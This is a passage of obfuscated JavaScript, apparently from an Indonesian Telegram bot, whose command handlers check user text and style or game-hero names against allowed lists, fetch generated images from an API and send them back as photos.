x2bfa),_0x1ce978[_0x240d04(0xc99)],_0x1ce978[_0x240d04(0x4e1)],_0x1ce978['hkxDp'],_0x1ce978[_0x240d04(0x1254)],_0x1ce978[_0x240d04(0x1013)],'riven-6',_0x1ce978[_0x240d04(0x2467)],_0x240d04(0x2155),_0x1ce978['ixpzH'],_0x1ce978['eBpON'],_0x240d04(0xbb1),_0x1ce978['LDgji'],_0x1ce978['VvatQ'],_0x1ce978[_0x240d04(0x1c72)],_0x1ce978[_0x240d04(0x1b90)],_0x1ce978[_0x240d04(0x83a)],_0x1ce978['HHmkf'],_0x1ce978[_0x240d04(0x23f0)],_0x1ce978[_0x240d04(0x2675)],_0x1ce978['FQGcs'],_0x1ce978[_0x240d04(0x256)],_0x1ce978[_0x240d04(0xd82)],_0x1ce978[_0x240d04(0x2749)],_0x240d04(0x1bee),_0x1ce978[_0x240d04(0x2c62)],_0x240d04(0xde8),_0x1ce978[_0x240d04(0x1f10)],_0x240d04(0xf9b),_0x1ce978[_0x240d04(0x1cd1)],_0x1ce978[_0x240d04(0x1bf4)],_0x240d04(0x1d46),_0x1ce978[_0x240d04(0x2124)],_0x1ce978['eBrkq'],_0x240d04(0xa7a),_0x1ce978[_0x240d04(0x1957)],_0x1ce978[_0x240d04(0x1ff6)],_0x1ce978[_0x240d04(0x1dde)],_0x240d04(0x2a07),_0x1ce978[_0x240d04(0xf03)],_0x1ce978[_0x240d04(0x13e2)],_0x1ce978[_0x240d04(0x2218)],_0x240d04(0x724),_0x1ce978[_0x240d04(0x2319)],_0x1ce978['FHcnV'],_0x240d04(0x5b0),_0x1ce978[_0x240d04(0x145b)],_0x1ce978[_0x240d04(0x1400)],_0x1ce978[_0x240d04(0x238f)],_0x240d04(0x62b),_0x1ce978[_0x240d04(0x1b96)],_0x240d04(0x6cd),_0x240d04(0x1bf2),_0x1ce978['DJgEL'],_0x1ce978[_0x240d04(0x29de)],_0x1ce978['heCRx'],_0x240d04(0x1105),_0x1ce978[_0x240d04(0x2065)],_0x1ce978[_0x240d04(0x149e)],_0x1ce978[_0x240d04(0xbe6)],_0x240d04(0x2363),_0x1ce978['jkPZH'],_0x240d04(0x1190),_0x1ce978['hUkrU'],_0x1ce978[_0x240d04(0x67d)],_0x1ce978[_0x240d04(0x1fab)],_0x1ce978[_0x240d04(0xadd)],'darius-4',_0x1ce978[_0x240d04(0x1bf)],_0x1ce978[_0x240d04(0x3ef)],_0x240d04(0x25a),_0x1ce978[_0x240d04(0x266d)],_0x1ce978['kXSLz'],_0x240d04(0x13d2),_0x240d04(0x19d8),_0x240d04(0x1974),_0x1ce978[_0x240d04(0x1bae)],_0x1ce978['sNcQa'],_0x1ce978[_0x240d04(0x1a0)],_0x1ce978[_0x240d04(0xa69)],_0x1ce978[_0x240d04(0x1eab)],_0x1ce978[_0x240d04(0xdb6)],_0x1ce978['mCJAC'],_0x1ce978['uFapI'],_0x1ce978[_0x240d04(0x190e)],_0x240d04(0xb13),_0x1ce978[_0x240d04(0x22ba)],_0x1ce978[_0x240d04(0x6c0)],_0x1ce978['aeIzo'],_0x240d04(0x169a),'lucian-3',_0x1ce978['Dwjun'],_0x1ce978[_0x240d04(0x2687)],_0x1ce978[_0x240d04(0xaf3)],_0x1ce978['EtmVT'],_0x1ce978[_0x240d04(0x2835)],_0x1ce978[_0x240d04(0x1f60)],_0x1ce978[_0x240d04(0xff0)],_0x240d04(0x117f),_0x1ce978[_0x240d04(0x2648)],_0x1ce978['RPMyo'],_0x240d04(0x2c27)+_0x240d04(0xe54),_0x1ce978[_0x240d04(0x282a)],_0x1ce978[_0x240d04(0x2274)],_0x1ce978[_0x240d04(0x256)],_0x1ce978[_0x240d04(0x286c)],_0x1ce978[_0x240d04(0x1493)],_0x1ce978['JPome'],_0x1ce978[_0x240d04(0x22bd)],_0x1ce978[_0x240d04(0x3cb)],_0x1ce978[_0x240d04(0x1d35)],_0x1ce978[_0x240d04(0x11e3)],_0x1ce978[_0x240d04(0x280a)],_0x1ce978['XibAt'],_0x240d04(0x1b6a),_0x1ce978['DrPYk'],_0x1ce978[_0x240d04(0xffc)],_0x1ce978[_0x240d04(0x1590)],_0x1ce978[_0x240d04(0x1b4c)],_0x1ce978[_0x240d04(0x1525)],_0x1ce978[_0x240d04(0x1425)],_0x240d04(0x2798)+'n',_0x240d04(0x2ea6),_0x1ce978[_0x240d04(0x747)],_0x240d04(0x2b2e),_0x1ce978['ZBZJS'],_0x1ce978['yrIIO'],_0x1ce978[_0x240d04(0x1c99)],_0x1ce978[_0x240d04(0x2b7a)],_0x1ce978[_0x240d04(0x2e52)],_0x1ce978[_0x240d04(0x2e8c)],_0x1ce978[_0x240d04(0x28ca)],'poppy',_0x240d04(0x81b),'jax','vi',_0x1ce978[_0x240d04(0x15c9)],_0x1ce978[_0x240d04(0x2a9f)],_0x1ce978['lkOKr'],_0x1ce978[_0x240d04(0x291b)],_0x1ce978[_0x240d04(0x1527)],_0x1ce978[_0x240d04(0xd5d)],_0x240d04(0x165e),_0x1ce978[_0x240d04(0x1d54)],_0x240d04(0xf41),_0x1ce978['fKwFJ'],_0x1ce978[_0x240d04(0x2613)],_0x1ce978[_0x240d04(0x10da)],_0x1ce978[_0x240d04(0x2529)],_0x1ce978['ERDhH'],_0x1ce978[_0x240d04(0xdd6)],_0x240d04(0x225d),_0x1ce978[_0x240d04(0x1d23)],_0x240d04(0x2d2),_0x1ce978[_0x240d04(0x22c0)],_0x240d04(0x1531)+_0x240d04(0x16b8),_0x1ce978[_0x240d04(0xb56)],_0x1ce978[_0x240d04(0x12f0)],_0x1ce978[_0x240d04(0x9d2)],_0x1ce978[_0x240d04(0x136e)],_0x1ce978[_0x240d04(0xf29)],_0x1ce978[_0x240d04(0x348)],_0x1ce978[_0x240d04(0xe0b)],_0x1ce978['TMDGs'],_0x1ce978[_0x240d04(0x19d4)],_0x1ce978['BaiCS'],_0x1ce978['aSWnJ'],_0x1ce978['qKJvH'],_0x1ce978[_0x240d04(0x613)],_0x1ce978[_0x240d04(0x2cde)],_0x1ce978[_0x240d04(0x2b80)],_0x1ce978[_0x240d04(0x1845)],_0x1ce978['erYSt'],_0x1ce978[_0x240d04(0x65d)],_0x1ce978[_0x240d04(0x2269)],_0x240d04(0x1915),_0x1ce978['PMVrh'],_0x1ce978[_0x240d04(0x2e90)],_0x1ce978[_0x240d04(0x1bfe)],_0x1ce978[_0x240d04(0x2c1f)],_0x240d04(0x23a8),_0x1ce978[_0x240d04(0x1a6d)],_0x1ce978[_0x240d04(0x10ba)],_0x1ce978[_0x240d04(0x1a06)],'lucian',_0x1ce978['nIzQD'],_0x1ce978[_0x240d04(0x2cd8)],_0x240d04(0x10fd),_0x1ce978[_0x240d04(0x2a78)],_0x1ce978[_0x240d04(0x1023)],_0x1ce978[_0x240d04(0x23a0)],_0x240d04(0x1404),'teemo',_0x1ce978['ZNXHv'],_0x240d04(0x790),'brand',_0x240d04(0xe29),_0x1ce978[_0x240d04(0x763)],_0x1ce978[_0x240d04(0x2e76)],_0x1ce978['OWxkX'],_0x1ce978[_0x240d04(0x1315)],_0x1ce978[_0x240d04(0x2a45)],_0x1ce978[_0x240d04(0x1854)],_0x1ce978[_0x240d04(0x21a2)],_0x1ce978[_0x240d04(0x844)],_0x1ce978[_0x240d04(0x2dae)],_0x1ce978[_0x240d04(0x2003)],_0x1ce978[_0x240d04(0x1195)],_0x240d04(0x1cf8),_0x240d04(0x18c7),_0x1ce978['oByyJ'],_0x1ce978['ThuTX'],_0x1ce978['fbHLf'],_0x1ce978[_0x240d04(0x5eb)],_0x1ce978['dXkle'],_0x1ce978[_0x240d04(0x19bc)],_0x1ce978[_0x240d04(0x2dfd)],_0x1ce978[_0x240d04(0x2118)],_0x1ce978['otuDQ'],_0x240d04(0x2520),_0x1ce978[_0x240d04(0x375)],_0x1ce978[_0x240d04(0x1155)],_0x1ce978[_0x240d04(0xe7)],_0x240d04(0x11f7),_0x1ce978[_0x240d04(0x2365)],_0x1ce978[_0x240d04(0x239a)],_0x1ce978[_0x240d04(0x1db6)],_0x1ce978[_0x240d04(0x1a35)],_0x1ce978['DHonS'],_0x1ce978['vPhpn'],_0x1ce978['rGPCk'],'warwick-2',_0x1ce978[_0x240d04(0x27e2)],_0x240d04(0x8bf),_0x1ce978['QjbzB'],_0x1ce978[_0x240d04(0x1483)],_0x1ce978[_0x240d04(0xee1)],_0x1ce978[_0x240d04(0x24d7)],_0x1ce978['jTGbX'],_0x240d04(0x155c),_0x240d04(0x2408),_0x240d04(0xcea),_0x240d04(0x19c4),_0x1ce978['iAZSy'],_0x1ce978[_0x240d04(0x24d5)],_0x240d04(0x1555)+'er','amumu',_0x1ce978['JCXna'],'nasus',_0x1ce978[_0x240d04(0x662)],_0x240d04(0xc6d),_0x240d04(0x16a1),_0x1ce978[_0x240d04(0x2c23)],_0x1ce978[_0x240d04(0x28c4)],_0x1ce978[_0x240d04(0x1a75)],_0x1ce978[_0x240d04(0x90c)],_0x240d04(0x2e31),_0x1ce978[_0x240d04(0x74f)],_0x1ce978['jEhEo'],_0x1ce978[_0x240d04(0x21d5)],_0x1ce978[_0x240d04(0x7d2)],_0x1ce978['mhTkW'],_0x1ce978[_0x240d04(0x2958)],_0x240d04(0x2d8f),_0x1ce978['SqtsU'],_0x1ce978[_0x240d04(0x113)],_0x240d04(0xfee),_0x1ce978[_0x240d04(0x4b3)],_0x1ce978[_0x240d04(0x11ef)],_0x1ce978[_0x240d04(0x64d)],_0x1ce978[_0x240d04(0x2da)],_0x1ce978[_0x240d04(0x1960)],_0x1ce978['xjTqc'],_0x240d04(0xe5b),_0x1ce978[_0x240d04(0x2dce)],'brand-2',_0x1ce978['MFlYA'],_0x1ce978[_0x240d04(0x20e2)],_0x1ce978[_0x240d04(0x1781)],_0x240d04(0x10cc),_0x1ce978[_0x240d04(0x1fe2)],_0x1ce978['RgbZK'],_0x1ce978['vTatA'],_0x1ce978[_0x240d04(0xf6f)],_0x240d04(0x9ea),_0x1ce978['oxkwS'],_0x1ce978[_0x240d04(0x1efd)],_0x1ce978[_0x240d04(0xbf7)],_0x240d04(0x1a47),_0x1ce978[_0x240d04(0x194c)],'jarvan-2',_0x1ce978['iYRvF'],_0x1ce978[_0x240d04(0xe59)],_0x1ce978['koZFV'],_0x1ce978[_0x240d04(0xfc6)],_0x1ce978['tRmIU'],_0x1ce978[_0x240d04(0xc2d)],_0x1ce978[_0x240d04(0x2955)],_0x1ce978[_0x240d04(0x2adc)],_0x1ce978[_0x240d04(0x812)],_0x1ce978[_0x240d04(0x1f7f)],_0x240d04(0x2252),_0x1ce978[_0x240d04(0x18a3)],_0x1ce978['bERLv'],_0x240d04(0x34f),_0x1ce978[_0x240d04(0x200)],_0x1ce978[_0x240d04(0x27e1)],_0x1ce978[_0x240d04(0x2d0c)],'vayne-4',_0x240d04(0x392),_0x1ce978[_0x240d04(0x380)],_0x1ce978[_0x240d04(0x1bc9)],_0x1ce978[_0x240d04(0x1bae)],_0x240d04(0x1bb),_0x1ce978[_0x240d04(0xec2)],_0x1ce978[_0x240d04(0x2052)],_0x1ce978[_0x240d04(0x2148)],_0x1ce978[_0x240d04(0x1279)],_0x240d04(0x2940),_0x1ce978['EpNAT'],_0x1ce978[_0x240d04(0x2cdf)],_0x1ce978[_0x240d04(0x7a6)],_0x240d04(0x1a76),_0x1ce978[_0x240d04(0x2121)],'varus-3',_0x240d04(0x2a60),_0x1ce978['uaUBR'],_0x1ce978[_0x240d04(0x195f)],_0x240d04(0x1335),_0x240d04(0x28ea),_0x1ce978[_0x240d04(0x1b5c)],_0x1ce978[_0x240d04(0xdd5)],_0x1ce978[_0x240d04(0x2b31)],_0x1ce978[_0x240d04(0x3b1)],_0x1ce978[_0x240d04(0x613)],_0x240d04(0x948),_0x1ce978['krFYZ'],_0x240d04(0x1051),'evelynn-2',_0x1ce978[_0x240d04(0x22ae)],_0x240d04(0x25c2),_0x1ce978[_0x240d04(0x15da)],_0x1ce978[_0x240d04(0x128f)],_0x1ce978[_0x240d04(0x1216)],_0x1ce978[_0x240d04(0x1bef)],_0x1ce978[_0x240d04(0x2525)],'zed-3',_0x1ce978['yipwj'],_0x240d04(0x1ff9),_0x1ce978['asGWF'],'poppy-2',_0x1ce978[_0x240d04(0x2553)],_0x1ce978[_0x240d04(0x2aa7)],_0x240d04(0x282),_0x1ce978[_0x240d04(0x222b)],_0x1ce978['RPYym'],_0x240d04(0x2970),_0x1ce978[_0x240d04(0x8f3)],_0x240d04(0x2ade),_0x1ce978[_0x240d04(0x1675)],_0x1ce978[_0x240d04(0xb4d)],_0x1ce978[_0x240d04(0x15f8)],_0x1ce978[_0x240d04(0xbd0)],_0x1ce978[_0x240d04(0x1d9f)],_0x1ce978['CuXHb'],_0x1ce978[_0x240d04(0x1591)],_0x1ce978[_0x240d04(0x2130)],_0x1ce978['BeXom'],_0x1ce978[_0x240d04(0x873)],_0x1ce978[_0x240d04(0x1e0)],_0x1ce978[_0x240d04(0x28d6)],_0x1ce978[_0x240d04(0x1697)],_0x1ce978[_0x240d04(0x2c48)],_0x240d04(0xf11),_0x1ce978[_0x240d04(0x17c7)],_0x1ce978[_0x240d04(0x305)],_0x1ce978[_0x240d04(0x1ef8)],_0x1ce978[_0x240d04(0x28ed)],_0x240d04(0x1ec6),_0x1ce978['WIGVo'],_0x1ce978['cmsCP'],'jinx-3','orianna-3',_0x1ce978['vlFtb'],'kaisa-3',_0x1ce978[_0x240d04(0x1f0a)],_0x1ce978[_0x240d04(0xa83)],_0x1ce978[_0x240d04(0x1d5f)],_0x1ce978[_0x240d04(0x1a4)],_0x1ce978[_0x240d04(0x1992)],_0x1ce978[_0x240d04(0x10b9)],_0x1ce978[_0x240d04(0x233e)],_0x1ce978[_0x240d04(0x10e8)],_0x1ce978[_0x240d04(0xe6a)],_0x1ce978[_0x240d04(0x17b3)],_0x1ce978[_0x240d04(0x12e2)],_0x240d04(0x1ffa),'amumu-2',_0x1ce978[_0x240d04(0x2257)],_0x1ce978[_0x240d04(0x1c22)],_0x1ce978[_0x240d04(0x2132)],_0x1ce978[_0x240d04(0x1605)],_0x1ce978[_0x240d04(0x1b0)],_0x240d04(0x93a),_0x240d04(0x1b73)+_0x240d04(0x3c1),_0x1ce978[_0x240d04(0x8fc)],_0x1ce978[_0x240d04(0x1c30)],'soraka-4',_0x1ce978['psIkb'],_0x1ce978[_0x240d04(0x292)],_0x1ce978[_0x240d04(0x11f3)],'nasteryi-4',_0x1ce978[_0x240d04(0xeb)],_0x1ce978['sIXeB'],_0x1ce978['tLlUk'],_0x1ce978[_0x240d04(0x2841)],_0x1ce978[_0x240d04(0x838)],_0x1ce978['oqVwg'],_0x1ce978[_0x240d04(0x2304)],_0x240d04(0x596),_0x1ce978['Hiihk'],_0x1ce978[_0x240d04(0xf97)],_0x1ce978[_0x240d04(0x1f11)],_0x1ce978[_0x240d04(0xc59)],_0x1ce978['uKqOf'],_0x1ce978[_0x240d04(0x1834)],_0x1ce978[_0x240d04(0x1f39)],_0x1ce978[_0x240d04(0xdf4)],_0x1ce978[_0x240d04(0x1d5a)],_0x1ce978[_0x240d04(0x13b3)],_0x1ce978[_0x240d04(0x1acf)],_0x1ce978['yknLH'],_0x1ce978[_0x240d04(0x1c7e)],'gangplank-'+'2',_0x1ce978[_0x240d04(0xb12)],'azir-3',_0x1ce978[_0x240d04(0x732)],_0x240d04(0x4fd),_0x1ce978['pLDuO'],_0x1ce978['XjKPG'],_0x1ce978[_0x240d04(0x5ce)],_0x1ce978['UiJAB'],_0x1ce978['oLqFV'],_0x1ce978[_0x240d04(0xf4)],_0x1ce978['vifvj'],_0x1ce978['ZmhCu'],_0x240d04(0x1629),_0x1ce978['tQrcP'],_0x1ce978[_0x240d04(0x2416)],_0x1ce978[_0x240d04(0x2572)],'brand-3','anivia-2',_0x1ce978[_0x240d04(0x2208)],_0x240d04(0x537),_0x1ce978['pAdIE'],_0x1ce978[_0x240d04(0xb95)],_0x1ce978['JwvCd'],_0x240d04(0x1257),_0x1ce978[_0x240d04(0x2510)],_0x1ce978[_0x240d04(0x2d0d)],_0x240d04(0x1f8),_0x1ce978[_0x240d04(0x1eb2)],_0x1ce978[_0x240d04(0x1279)],_0x240d04(0x2de),_0x1ce978[_0x240d04(0x5c5)],_0x1ce978['XxDEI'],_0x240d04(0x28b2),_0x240d04(0x89e),_0x1ce978['LgZSV'],_0x1ce978[_0x240d04(0x69e)],_0x1ce978[_0x240d04(0x1f85)],_0x1ce978[_0x240d04(0xcd2)],_0x1ce978[_0x240d04(0x17a3)],_0x240d04(0x1672),_0x1ce978[_0x240d04(0x281c)],_0x1ce978['Pmhyi']];if(!_0x533c3d[_0x240d04(0x55c)](bawah))_0x1ce978[_0x240d04(0x9bc)](_0x555a99,_0x533c3d,_0x533c3d['length'],_0x1ce978[_0x240d04(0xe65)]);else{_0x1ce978[_0x240d04(0x14e1)](_0x476bfb,lang[_0x240d04(0x172a)]);let _0x47b1d9=_0x1ce978[_0x240d04(0x1ad4)](api,_0x1ce978[_0x240d04(0x44a)],_0x1ce978[_0x240d04(0xb39)](_0x1ce978['jrCNG'],_0x3e6565),{'text':atas,'heroes':bawah},_0x240d04(0x23aa)),_0x41ab72=await _0x1ce978[_0x240d04(0x1b82)](fetch,_0x47b1d9);if(!_0x41ab72['ok'])throw await _0x41ab72[_0x240d04(0x1d8c)]();_0x23c0de[_0x240d04(0x2705)+'hoto']({'url':_0x47b1d9},{'caption':lang['ok']});}}}break;case _0x1ce978[_0x240d04(0xcfc)]:{if(_0x1ce978[_0x240d04(0xea8)](_0x1ce978['zhabs'],_0x1ce978[_0x240d04(0x2740)]))_0x224e71[_0x52961b]=_0x28bf6b[_0x21805c]||0x0,_0x260592[_0x1d111b+_0x240d04(0x1ade)]=_0x5c59a0[_0x233bfa+_0x240d04(0x1ade)]||0x64;else{if(!_0x33cfb1)return _0x1ce978['nKfYn'](_0x476bfb,'Kirim\x20peri'+_0x240d04(0xbb4)+(_0x1ec495+_0x3e6565)+(_0x240d04(0x1192)+_0x240d04(0x2e9f)+_0x240d04(0x2890)+_0x240d04(0x2df2))+_0x1ce978['MzwvF'](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0xd8)));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x1ce978[_0x240d04(0x24f5)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978['nplBQ'](_0x1ec495,_0x3e6565)+('\x20teks|styl'+_0x240d04(0x2e9f)+_0x240d04(0x2890)+_0x240d04(0x2df2))+(_0x1ec495+_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0xd8)));var _0x58693c=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1];const _0xd46ff1=[_0x1ce978[_0x240d04(0x13d1)],_0x1ce978[_0x240d04(0x1339)]];if(!_0xd46ff1[_0x240d04(0x55c)](bawah))_0x1ce978['BzIWh'](_0x555a99,_0xd46ff1,_0xd46ff1[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0x1861)]);else{_0x1ce978['JKWwh'](_0x476bfb,lang[_0x240d04(0x172a)]);let _0x39e6f8=api(_0x1ce978[_0x240d04(0x44a)],_0x1ce978[_0x240d04(0x1137)](_0x1ce978[_0x240d04(0x284e)],_0x3e6565),{'text':_0x2b7b14,'style':_0x83dd4c},_0x1ce978[_0x240d04(0x2536)]),_0x3c780f=await _0x1ce978[_0x240d04(0x2719)](fetch,_0x39e6f8);if(!_0x3c780f['ok'])throw await _0x3c780f[_0x240d04(0x1d8c)]();_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x39e6f8},{'caption':lang['ok']});}}}break;case _0x1ce978['EgJqV']:{if(_0x1ce978['oDDSy'](_0x1ce978[_0x240d04(0x1403)],_0x1ce978[_0x240d04(0x2a76)])){if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x1a52)](_0x476bfb,_0x240d04(0x2972)+'ntah:\x0a`'+_0x1ce978[_0x240d04(0x2877)](_0x1ec495,_0x3e6565)+(_0x240d04(0x2369)+_0x240d04(0x1f65)+_0x240d04(0x2890)+'n:\x0a`')+_0x1ce978[_0x240d04(0xa5d)](_0x1ec495,_0x3e6565)+('\x20NdikzOne|'+_0x240d04(0x2ce5)+_0x240d04(0x2be8)));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x1ce978[_0x240d04(0x17d7)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x1ca7)](_0x1ec495,_0x3e6565)+('\x20teks|colo'+_0x240d04(0x1f65)+_0x240d04(0x2890)+_0x240d04(0x2df2))+_0x1ce978[_0x240d04(0x785)](_0x1ec495,_0x3e6565)+('\x20NdikzOne|'+'green-yell'+_0x240d04(0x2be8)));var _0x58693c=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1];const _0x1609a5=[_0x1ce978[_0x240d04(0xdad)],_0x1ce978[_0x240d04(0x1495)],_0x1ce978['VWhyA'],_0x1ce978['WAVWF'],'cyan-purpl'+'e',_0x1ce978[_0x240d04(0x2271)]];if(!_0x1609a5[_0x240d04(0x55c)](_0x83dd4c))_0x1ce978[_0x240d04(0x9bc)](_0x555a99,_0x1609a5,_0x1609a5[_0x240d04(0x2b45)],_0x1ce978['yHYEA']);else{if(_0x1ce978['wNFCI'](_0x1ce978[_0x240d04(0x1ab)],_0x240d04(0x1953)))_0x5a4204[_0x240d04(0x15e)](_0x388a81),_0x317160(_0x1ce978[_0x240d04(0x1bb3)](_0x240d04(0x21e3)+_0x240d04(0x249b),_0x5b7970[_0x240d04(0x960)]));else{_0x1ce978[_0x240d04(0x199d)](_0x476bfb,lang[_0x240d04(0x172a)]);let _0x515881=_0x1ce978[_0x240d04(0x1ad4)](api,_0x240d04(0x10a),_0x1ce978['jrCNG']+_0x3e6565,{'text':_0x2b7b14,'color':_0x83dd4c},_0x1ce978[_0x240d04(0x2536)]),_0x234075=await _0x1ce978['CiAlu'](fetch,_0x515881);if(!_0x234075['ok'])throw await _0x234075['text']();_0x23c0de['replyWithP'+'hoto']({'url':_0x515881},{'caption':lang['ok']});}}}else _0x35df06=_0x5ef04e['parse'](_0x25d7d9[_0x240d04(0x2113)+'nc'](_0x58b5dd));}break;case _0x240d04(0x4b5)+_0x240d04(0x837):{if(!_0x33cfb1)return _0x1ce978[_0x240d04(0xca9)](_0x476bfb,'Kirim\x20peri'+'ntah:\x0a`'+_0x1ce978[_0x240d04(0x125c)](_0x1ec495,_0x3e6565)+('\x20teks|styl'+_0x240d04(0x2e9f)+_0x240d04(0x2890)+'n:\x0a`')+_0x1ce978[_0x240d04(0x1a78)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+'panther`'));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x1ce978[_0x240d04(0x1489)](_0x476bfb,_0x240d04(0x2972)+'ntah:\x0a`'+_0x1ce978['KjHAW'](_0x1ec495,_0x3e6565)+(_0x240d04(0x1192)+_0x240d04(0x2e9f)+_0x240d04(0x2890)+_0x240d04(0x2df2))+_0x1ce978[_0x240d04(0x1265)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x16e8)));var _0x58693c=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1];const _0x300854=[_0x240d04(0x23c0),'dragon',_0x1ce978[_0x240d04(0x23f8)],_0x1ce978[_0x240d04(0x2d5b)],_0x1ce978[_0x240d04(0x316)],_0x1ce978[_0x240d04(0x1928)],_0x1ce978[_0x240d04(0x2020)],_0x240d04(0xab9),_0x1ce978['HjaXA'],_0x240d04(0x11c0),_0x1ce978[_0x240d04(0x1bba)],_0x1ce978[_0x240d04(0x1a12)],_0x1ce978[_0x240d04(0x1235)],_0x240d04(0x22cd),_0x1ce978[_0x240d04(0x11e4)],_0x1ce978[_0x240d04(0x2c7b)],_0x1ce978['rpeLR'],_0x1ce978[_0x240d04(0xc9f)],'deer',_0x240d04(0x2721),_0x1ce978['fdLsc'],_0x1ce978[_0x240d04(0x18ba)]];if(!_0x300854[_0x240d04(0x55c)](_0x83dd4c)){if('EwnkK'!==_0x1ce978[_0x240d04(0xc13)])_0x1ce978[_0x240d04(0x2576)](_0x555a99,_0x300854,_0x300854['length'],_0x240d04(0x26c2));else return _0x275ec5(_0x1ce978[_0x240d04(0x1453)]);}else{_0x1ce978['ZqnGK'](_0x476bfb,lang[_0x240d04(0x172a)]);let _0x2b7309=_0x1ce978['jkJNj'](api,_0x240d04(0x10a),_0x1ce978[_0x240d04(0x413)](_0x1ce978['jrCNG'],_0x3e6565),{'text':_0x2b7b14,'style':_0x83dd4c},_0x1ce978[_0x240d04(0x2536)]),_0x569901=await _0x1ce978[_0x240d04(0x3a0)](fetch,_0x2b7309);if(!_0x569901['ok'])throw await _0x569901[_0x240d04(0x1d8c)]();_0x23c0de['replyWithP'+'hoto']({'url':_0x2b7309},{'caption':lang['ok']});}}break;case _0x1ce978[_0x240d04(0x2b20)]:{if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x3a0)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+(_0x1ec495+_0x3e6565)+_0x240d04(0x216f));_0x23c0de['reply'](_0x240d04(0xcf6)+'alah\x20teks\x20'+'yang\x20bisa\x20'+'kamu\x20salin'+_0x240d04(0x2602)+_0x33cfb1+'`',{'parse_mode':_0x1ce978[_0x240d04(0xa1b)],'reply_markup':{'inline_keyboard':[[{'text':_0x1ce978[_0x240d04(0x23cb)],'switch_inline_query_current_chat':_0x33cfb1}]]}});}break;case _0x1ce978[_0x240d04(0x2a54)]:{if(!_0x33cfb1)return _0x476bfb('Kirim\x20peri'+'ntah:\x0a`'+_0x1ce978[_0x240d04(0x442)](_0x1ec495,_0x3e6565)+(_0x240d04(0xd93)+'es`\x0a\x0aConto'+_0x240d04(0x1d12)+_0x240d04(0x2ee2))+_0x1ce978[_0x240d04(0xc1d)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x1325)));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x476bfb('Kirim\x20peri'+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x1aea)](_0x1ec495,_0x3e6565)+('\x20teks|hero'+_0x240d04(0x13ff)+_0x240d04(0x1d12)+_0x240d04(0x2ee2))+(_0x1ec495+_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x1325)));var _0x58693c=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1];const _0x4b72c1=[_0x1ce978['bVlKs'],_0x1ce978[_0x240d04(0x11fd)],_0x240d04(0xe45),_0x1ce978[_0x240d04(0x595)],_0x1ce978['kIhUX'],'skud-2',_0x1ce978[_0x240d04(0x2173)],_0x1ce978[_0x240d04(0x2099)],_0x240d04(0x3fc),_0x1ce978['fpSNN'],_0x1ce978['ATinY'],_0x1ce978[_0x240d04(0x9fb)],_0x1ce978[_0x240d04(0xf2e)],_0x1ce978[_0x240d04(0x1ee0)],_0x1ce978[_0x240d04(0x1f83)],_0x240d04(0x23f5),_0x240d04(0x2e0d),_0x240d04(0x2c5d),_0x240d04(0xea),_0x1ce978['yShjK'],_0x1ce978['GLITm'],_0x1ce978[_0x240d04(0x277e)],_0x1ce978[_0x240d04(0x1b3d)],_0x1ce978[_0x240d04(0x32c)],_0x1ce978[_0x240d04(0x1e3a)],_0x1ce978[_0x240d04(0x1a28)],_0x1ce978[_0x240d04(0x13e7)],_0x1ce978[_0x240d04(0x27db)],_0x240d04(0x129f),_0x1ce978['OaaYf'],_0x1ce978[_0x240d04(0x2376)],_0x1ce978[_0x240d04(0xc92)],_0x1ce978[_0x240d04(0x23d5)],_0x1ce978[_0x240d04(0x23f3)],_0x240d04(0x25aa),_0x1ce978[_0x240d04(0x511)],_0x1ce978[_0x240d04(0x18e2)],_0x1ce978['vWdxA'],_0x1ce978['RvgdB'],_0x240d04(0x966),_0x1ce978['jFSrY'],_0x1ce978[_0x240d04(0x2636)],_0x240d04(0x15fd),_0x1ce978[_0x240d04(0xcdd)],_0x1ce978[_0x240d04(0x1793)],_0x1ce978['wqRbT'],_0x240d04(0x297b),_0x240d04(0x2e71),_0x240d04(0x2770),_0x1ce978['fYLPn'],_0x240d04(0x1fa),'ryoma-4',_0x1ce978[_0x240d04(0x1523)],_0x1ce978[_0x240d04(0xadb)],_0x240d04(0xe1c),_0x1ce978['KjgHt'],_0x1ce978[_0x240d04(0x1d1b)],_0x1ce978['jTMfy'],'ignis-2',_0x1ce978[_0x240d04(0xeff)],_0x240d04(0x1fb4),_0x1ce978['UZyRo'],_0x1ce978[_0x240d04(0xb0b)],_0x1ce978['fhosA'],_0x1ce978[_0x240d04(0x2b7e)],'krizzix-2',_0x1ce978[_0x240d04(0xb47)],_0x1ce978['BjtxY'],_0x240d04(0x1179),_0x1ce978[_0x240d04(0xcaa)],_0x1ce978['fEuIM'],_0x1ce978[_0x240d04(0x17db)],_0x240d04(0x4a1),_0x1ce978[_0x240d04(0x14c5)],_0x240d04(0xc2),_0x1ce978['IDDri'],_0x1ce978[_0x240d04(0x9c